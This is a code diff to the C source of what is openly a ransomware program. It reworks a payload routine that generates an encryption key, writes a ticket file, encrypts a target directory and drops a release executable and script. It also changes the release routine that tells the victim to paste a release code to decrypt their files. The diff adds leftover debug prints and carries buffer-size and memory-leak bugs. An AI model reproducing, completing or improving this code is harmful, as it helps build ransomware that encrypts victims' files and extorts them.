@@ -6,9 +6,10 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include "common/clonelib.h"
-#include "common/ransomlib.h"
 #include "common/common.h"
+#include "common/clonelib.h"
+#include "common/crypt.h"
+#include "common/ransomlib.h"
 #include "common/os.h"
 #include "common/thirdparty/b64.h"
 
@@ -29,10 +30,26 @@ bool runPayload(const char *directory, const char *arg0)
 			"Error: runPayLoad: failed to generate keyiv");
 		return 0;
 	}
+	
+	//Write ticket
+	if(!makeTicket(keyiv, directory)){
+		fprintf(stderr, "Error: runPayLoad: makeTicket Failed\n");
+		free(keyiv);
+		return 0;
+	}	
+	
 	//Encrypt Directory
 	if (!encryptDirectory(keyiv, directory)) {
 		fprintf(stderr, "runPayload: encryptDirectory failed\n");
 		free(keyiv);
+		
+		//Delete ticket
+		char *t_path = (char *) malloc(strlen(directory) + strlen("/"TICKET_FILENAME));
+		strcpy(t_path, directory);
+		strcat(t_path, "/"TICKET_FILENAME);
+		remove(t_path);
+		free(t_path);
+		
 		return 0;
 	}
 	//Get OSIR's Bytes
@@ -41,15 +58,15 @@ bool runPayload(const char *directory, const char *arg0)
 
 	//Get release program path
 	char *r_path =
-	    (char *) malloc(strlen(directory) + strlen("/release.exe"));
+	    (char *) malloc(strlen(directory) + strlen("/"RELEASE_FILENAME));
 	strcpy(r_path, directory);
-	strcat(r_path, "/release.exe");
+	strcat(r_path, "/"RELEASE_FILENAME);
 
 	//Write release program
 	FILE *fp = fopen(r_path, "wb");
 	if (fp == NULL) {
 		fprintf(stderr,
-			"Error: runPayload: Couldn't open file for cloning(%s)\n",
+			"Error: runPayload: Couldn't open file to write clone(%s)\n",
 			r_path);
 		free(r_path);
 		free(keyiv);
@@ -58,14 +75,36 @@ bool runPayload(const char *directory, const char *arg0)
 	fwrite(bytes, bytes_size, 1, fp);
 	fclose(fp);
 
-
-	//Write ticket
-	makeTicket(keyiv, directory);
-
+	//Get Release Script Directory
+	r_path =
+	    (char *) malloc(strlen(directory) + strlen("/"RELEASE_SCRIPT_FILENAME));
+	strcpy(r_path, directory);
+	strcat(r_path, "/"RELEASE_SCRIPT_FILENAME);
+	
+	//Write Release Script
+	printf("op\n");
+	fp = fopen(r_path, "w");
+	printf("%s\n",r_path);
+	if(fp == NULL){
+		fprintf(stderr,
+			"Error: runPayload: Couldn't open file to write release script(%s)\n",
+			r_path);
+		free(r_path);
+		free(keyiv);
+		return 0;
+	}
+	printf("wb\n");
+	fwrite(RELEASE_SCRIPT,strlen(RELEASE_SCRIPT), 1, fp);
+	fclose(fp);
+	
 	//Free pointers
+	printf("free\n");
 	free(bytes);
-	free(r_path);
+	printf("r\n");
+	//free(r_path);
+	printf("k\n");
 	free(keyiv);
+	printf("ret\n");
 	return 1;
 }
 
@@ -73,8 +112,7 @@ bool runPayload(const char *directory, const char *arg0)
 bool runRelease()
 {
 	system(RELEASE_INTRO_SCRIPT);
-	printf("To decrypt your files, please visit\n%s\n"
-	       "and paste the release code.\n\n", "x");
+	printf("To decrypt your files, please paste the release code.\n\n");
 
 	bool success = 0;
 
